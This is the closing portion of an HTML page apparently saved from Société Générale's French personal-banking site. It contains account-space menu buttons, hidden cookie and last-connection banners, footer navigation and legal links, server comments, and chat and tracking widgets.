        <img src="fichiers/picto-gsm.svg">
        <div class="eip-spec56_titre_btn">Gestion sous mandat</div>
        <div class="eip-spec56_btn_soustitre">Accéder à mon espace</div>
    </a>
</div>

</div>
<div class="dcw_visually-hidden" data-clientside-answer="alliage" data-clientside-method-name="getPrestCouranteTypeGestSousMandat" data-clientside-id="getPrest">
<div class="eip-spec56_btn_gsm_all_gcd eip-spec56_btn_asv">
    <a data-tms-element-label="Votre Espace Alliage Gestion" data-tms-container-label="contextual-menu-right" data-tms-click-type="N" href="#/com/icd-web/tor/tor-alliage-index.html#tor/accueil/" aria-label="Votre Espace Alliage gestion">
        <img src="fichiers/picto-gsm.svg">
        <div class="eip-spec56_titre_btn">Alliage gestion</div>
        <div class="eip-spec56_btn_soustitre">Accéder à mon espace</div>
    </a>
</div>
</div>
</section>
</aside>
<section class="dcw_gb_row dcw_gb_clearfix">
</section>
	</section>
	</section>
<aside class="dcw_msg-banner dcw_msg-banner--info" role="alert" id="cookieDisclaimer" style="display:none">
    <div class="dcw_msg-banner_msg-wrapper">
        <svg class="dcw_msg-banner_picto-info" aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20190321171150.svg#info"></use></svg>
        <p class="dcw_msg-banner_message">
            En poursuivant votre navigation sur ce site, vous acceptez 
l'utilisation de cookies pour vous proposer des publicités ciblées 
adaptées à vos centres d'intérêts et réaliser des statistiques. Pour en 
savoir plus et paramétrer vos cookies,&nbsp;<span style="font-size: 16px;"><a href="#/charte-cookies-societe-generale" class="eip_dcw_main-link">cliquez ici</a></span>.
        </p>
        <button class="dcw_msg-banner_btn-closed" arial-label="Fermer le message contextuel">
            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20190321171150.svg#close-2"></use></svg>
        </button>
    </div>
</aside><aside class="dcw_msg-banner dcw_msg-banner--info dcw_msg-banner--last-connexion" id="lastConnectionBanner" role="alert" style="display:none;">
<div class="dcw_msg-banner_msg-wrapper"><svg aria-hidden="true" class="dcw_msg-banner_picto-info" focusable="false"> <use width="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#info" height="100%"></use> </svg>
<p class="dcw_msg-banner_message" id="lastConnectionMessage">&nbsp;</p>
<button arial-label="Fermer le message contextuel" class="dcw_msg-banner_btn-closed"><svg aria-hidden="true" focusable="false"> <use width="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#close-2" height="100%"></use> </svg></button></div>
</aside>

<footer class="dcw_footer" role="contentinfo">
	<div class="dcw_footer-second">
		<div class="dcw_footer_container">
			<nav class="dcw_footer-second_nav">
				<ul class="dcw_footer-second_list">
					    <li class="dcw_footer-second_item">
<a data-tms-container-label="footer-general-shortcuts" href="http://agences.societegenerale.fr/banque-assurances/home.asp" data-tms-click-type="N" data-tms-element-label="trouver-une-agence">            <svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20190321171150.svg#localisation"></use></svg>
            Trouver une agence
</a>    </li>
    <li class="dcw_footer-second_item">
<a data-tms-container-label="footer-general-shortcuts" href="#/faq" data-tms-click-type="N" data-tms-element-label="questions-fréquentes">            <svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20190321171150.svg#question"></use></svg>
            Questions fréquentes
</a>    </li>
<li class="dcw_footer-second_item">
							<div class="dcw_dropdown js-dropdown">
    <button class="dcw_dropdown_titre js-dropdown_btn" aria-label="Ouvrir la liste des autres sites Société Générale" aria-expanded="false" aria-owns="dcw-dropdown-list">Autres sites Société Générale</button>
   <svg class="dcw_dropdown_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20190321171150.svg#arrow-dropdown"></use></svg>
    <ul class="dcw_dropdown_list toggle_content">
            <li class="dcw_dropdown_item">
                <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://www.privatebanking.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="banque-privée">Banque privée</a>
            </li>
            <li class="dcw_dropdown_item">
                <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://professionnels.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="professionnels">Professionnels</a>
            </li>
            <li class="dcw_dropdown_item">
                <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://entreprises.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="entreprises">Entreprises</a>
            </li>
            <li class="dcw_dropdown_item">
                <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://associations.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="associations">Associations</a>
            </li>
            <li class="dcw_dropdown_item">
                <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://www.societegenerale.com/fr/accueil" data-tms-click-type="N" data-tms-element-label="groupe-société-générale">Groupe Société Générale</a>
            </li>
    </ul>
</div></li>
					</ul>
			</nav>
			<ul class="dcw_footer_container dcw_footer-second_social">
				    <li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Facebook" href="https://www.facebook.com/societegenerale.france/" aria-label="Voir le groupe Facebook de la Société Générale" data-tms-click-type="N" data-tms-element-label="facebook">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20190321171150.svg#facebook-2"></use></svg>
</a>    </li>
    <li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Twitter" href="https://twitter.com/sg_etvous" aria-label="Voir le Twitter de la Société Générale" data-tms-click-type="N" data-tms-element-label="twitter">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20190321171150.svg#twitter-2"></use></svg>
</a>    </li>
    <li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Instagram" href="https://www.instagram.com/societegenerale/?hl=fr" aria-label="Voir l&#39; Instagram de la Société Générale" data-tms-click-type="N" data-tms-element-label="instagram">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20190321171150.svg#instagram"></use></svg>
</a>    </li>
</ul>
		</div>
	</div>
	<nav class="dcw_footer-third">
		<div class="dcw_footer_container">
			<img alt="Société Générale" aria-hidden="true" class="dcw_footer-third_logo" src="fichiers/logo-sg-seul.svg" width="150" height="30">
<ul class="dcw_footer-third_list">
				    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="#/tous-nos-tarifs" data-tms-click-type="N" data-tms-element-label="tarifs">Tarifs</a>
    </li>
    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="#/engagements" data-tms-click-type="N" data-tms-element-label="nos-engagements">Nos engagements</a>
    </li>
    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="#/informations-mentions-legales" data-tms-click-type="N" data-tms-element-label="informations-légales">Informations légales</a>
    </li>
    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="#/charte-cookies-societe-generale" data-tms-click-type="N" data-tms-element-label="charte-cookies">Charte Cookies</a>
    </li>
    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="#/securite" data-tms-click-type="N" data-tms-element-label="sécurité">Sécurité</a>
    </li>
    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="#/engagements/gestion-donnees-personnelles-rgpd" data-tms-click-type="N" data-tms-element-label="données-personnelles">Données personnelles</a>
    </li>
</ul>
		</div>
	</nav>
	        <div id="sticky_pageType" style="display:none;" data-value="SERVICE_EN_LIGNE"></div> 
        <div id="sticky_pageParcours" style="display:none;" data-value="BAQ-Prelevement"></div> 
</footer>
<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/regions/5040ed2049b0f510VgnVCM100000030013acRCRD -->
<!-- REQUEST PROFILE: BFM, REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 5040ed2049b0f510VgnVCM100000030013acRCRD, regionNames: gb2-com3-int,gb2-com2-int,gb2-com4-int,footer-int-without-closing-main, FURL_NAME: /aconec/cptbud/prlvts/default/footer, FURL_ID: 6ae686e506f2e510VgnVCM100000030013acRCRD --></div>
<div style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.8872137016612857"><img style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.6149419611295329" alt="" src="fichiers/0.txt" width="0" height="0"></div><div id="interactWrapper" class="sdcwrapper theme-banque-bddf theme-enseigne-bddf theme-marche-pri enseigne-BDDF marche-PRI theme-media-site-web integrationNGIM sdcContainer interactCSSWrapper"><div class="interact-layout" id="content"> <div class="interact-header"></div> <div class="interact-content"></div> <div class="interact-popin"></div> <div class="interact-footer"></div> <div class="interact-sticky"><div id="tch_sticky-bar" class="tch_sticky-bar_container"><div class="tch_sticky-contact_bar"> <h3 class="tch_sticky-bar_title">Besoin d'aide</h3> <p class="tch_sticky-bar_message"> Nos experts vous accompagnent dans le choix de la solution adaptée à vos besoins </p>  <button class="tch_sticky-bar_close" aria-label="Fermer la boite de dialogue"> <svg class="tch_sticky-bar_icon" aria-hidden="true"> <use width="100%" height="100%" xlink:href="/icd/static/interact-front/3.1.9//dist/7192c91ab83644fd923e57df75500d22.svg#cross-close"></use> </svg> </button></div></div><div id="tch_sticky-contact" class="tch_sticky-contact_container" style="display:none"></div></div> <div class="interact-chat"><div aria-grabbed="false" class="tch_chat"></div></div> <div id="interact-fab" class="interact-fab tch_fab"><div> <button class="js_fab_chat tch_fab__btn" aria-label="Ouvrir la fenêtre de tchat"> <svg class="tch_fab__icon" aria-hidden="true"> <use width="100%" height="100%" xlink:href="/icd/static/interact-front/3.1.9//dist/7192c91ab83644fd923e57df75500d22.svg#fab-contact"></use> </svg> </button> </div></div> <div class="interact-test"></div></div></div><iframe style="height: 0px; width: 0px; border: 0px none;" id="dmp_bridge_iframe" sandbox="allow-scripts allow-same-origin" src="./activi_files/dmp_bridge.html" width="0" height="0"></iframe><div id="lottie" class="inbenta-loader" iaf-loader="" style="display: none;"></div></body></html>